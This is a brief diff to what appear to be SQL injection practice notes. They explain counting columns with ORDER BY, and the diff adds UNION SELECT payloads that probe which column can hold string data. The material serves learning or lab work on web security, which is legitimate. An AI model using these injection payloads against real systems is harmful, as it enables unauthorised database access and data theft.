@@ -4,5 +4,7 @@ Step 1
 ' ORDER BY 1-- {Do this iteratively until you get an error on the no of columns}
 
 Step 2:
-' UNION select NULL,+NULL,+NULL--
+' UNION select 'a',NULL,NULL--
+' UNION select NULL,'a',NULL--
+' UNION select NULL,'zMjGhD',NULL--
 
